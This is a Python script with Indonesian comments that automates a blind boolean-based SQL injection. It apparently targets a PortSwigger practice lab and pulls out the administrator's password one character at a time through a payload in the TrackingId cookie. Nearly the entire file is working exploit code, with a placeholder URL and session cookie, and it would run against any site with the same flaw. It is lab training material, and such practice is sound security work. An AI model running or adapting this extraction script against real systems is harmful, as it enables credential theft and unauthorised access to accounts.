import requests
import string

# 1. Konfigurasi Target (Ganti sesuai URL lab kamu)
URL = "blablabla.com/"

# Gunakan requests.Session() biar koneksi HTTP di-reuse, jalannya jadi jauh lebih cepat
session = requests.Session()

# Karakter yang mau kita tebak (a-z, 0-9)
password = ""

print("[*] Memulai ekstraksi password administrator...")

# 2. Loop untuk menebak panjang password / posisi karakter (misal asumsi 20 karakter)
for position in range(1, 21):
    low = 0
    high = 126
    
    while low <= high:
        mid = (high+low) // 2
        # Payload SQLi untuk mendeteksi karakter di posisi tertentu
        # Menggunakan SUBSTRING untuk mengambil 1 huruf dan mencocokkannya
        payload = f"xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1))>'{mid}"
        
        # PortSwigger mendeteksi SQLi lewat Cookie TrackingId
        cookies = {
            "TrackingId": payload,
            "session": "GANTI_DENGAN_SESSION_COOKIE_KAMU" # Lihat di Storage/Application Burp Suite
        }
        
        # Kirim request ke server
        response = session.get(URL, cookies=cookies)
        
        # 3. Indikator True/False (Kondisi spesifik dari lab PortSwigger)
        if "Welcome back" in response.text:
            low = mid + 1
        else:
            high = mid - 1
            
    if low == 0:
        print(f"\n[*] Menemukan karakter NULL di posisi {position}. Ekstraksi dihentikan.")
        break
    #hasil while akan di chr()
    currentChar = chr(low)
    password += currentChar 
    print(f"[+] Karakter {position} ketemu: {currentChar} (ASCII {low}) -> Password sementara: {password}")
    # lalu dipush ke variable password
print(f"\n[Visual] Ekstraksi Selesai! Password administrator: {password}")